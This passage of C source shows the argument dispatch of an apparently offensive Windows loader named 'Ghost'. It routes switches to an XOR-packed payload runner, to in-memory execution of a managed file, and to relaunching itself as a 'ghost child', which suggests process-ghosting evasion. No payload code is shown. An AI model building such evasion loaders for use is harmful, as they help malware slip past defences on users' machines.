        puts("[+] Ghost child reached wmain.");
        return 0;
    }
    if (argc >= 2 && wcscmp(argv[1], GHOST_VXOR_SWITCH) == 0) {
        return RunVxorPackage(argc, argv);
    }
    if (argc >= 3 &&
        wcscmp(argv[1], GHOST_MANAGED_MEMORY_SWITCH) == 0) {
        return RunManagedFileFromMemory(argc - 2, argv + 2);
    }
    if (argc == 1) {
        LPWSTR selfPath = GetCurrentExecutablePath();
        wchar_t* selfArguments[3];
        int result;
        if (!selfPath) {
            PrintWin32Error("GetCurrentExecutablePath");
            return 1;
        }
        selfArguments[0] = argv[0];
        selfArguments[1] = selfPath;
        selfArguments[2] = (wchar_t*)GHOST_SELF_CHILD_SWITCH;
        result = RunTargetCommand(3, selfArguments);
        free(selfPath);
        return result;
    }
    return RunTargetCommand(argc, argv);
}
